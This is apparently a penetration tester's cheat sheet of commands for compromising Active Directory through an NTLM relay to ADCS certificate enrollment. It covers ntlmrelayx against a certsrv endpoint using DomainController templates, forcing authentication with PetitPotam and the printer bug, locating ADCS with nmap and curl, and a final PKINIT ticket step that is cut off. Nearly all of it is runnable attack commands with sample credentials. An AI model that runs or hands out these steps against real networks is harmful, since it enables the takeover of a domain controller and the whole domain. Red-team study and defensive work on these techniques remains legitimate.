

#Standard ntlmrelay
ntlmrelayx.py -tf
#Relay to ADCS
#relay a domain controller machine account:
ntlmrelayx.py -t http://10.1.15.9/certsrv/certnsh.asp -smb2support --adcs --template DomainController
#relay a standard machine account (members of “Domain Computers”)
ntlmrelayx.py -t http://10.1.15.9/certsrv/certnsh.asp -smb2support --adcs --template Computer



#Trigger petitpotam:
#Works UNauthenticated against DCs only:
python3 /opt/outils/windows/PetitPotam/PetitPotam.py listener targetIP
#Otherwise creds are needed:
python3 /opt/outils/windows/PetitPotam/PetitPotam.py -u "john" -p 'Password1234' -d domain.com listenerIP targetIP
#Try the webdav address trick (webclient service must be installed on target which is not default):
#https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb
python3 /opt/outils/windows/PetitPotam/PetitPotam.py -u "john" -p 'Password1234' -d domain.com listenerIP@80/asdf targetIP

#Trigger printspooler:
proxychains python3 /opt/outils/windows/krbrelayx/printerbug.py listenerIP 'domain.com/user:password@targetIP'


#Identify ADCS
#	ADCS role is often hosted on the Domain Controller
#nmap -sV -p 80,443 -iL hostsHTTP.list -oA scanHTTP.nmap
#Search for Headers like these:
	HTTP/1.1 401 Unauthorized
	Content-Type: text/html
	Server: Microsoft-IIS/10.0
	WWW-Authenticate: NTLM
	WWW-Authenticate: Negotiate
	Date: Fri, 12 Nov 2021 16:16:20 GMT
	Content-Length: 1293
#auth is required for accesing :
#	http://<server>/certsrv/
#	Then banner will display "Microsoft Active Directory Certificate Services"
#	verify with
#		curl http://10.1.15.9/certsrv/ -u username --ntlm -I
#		curl http://10.1.15.9/certsrv/ -u username --ntlm



#Use a machine certificate for code exec
python gettgtpkinit.py 
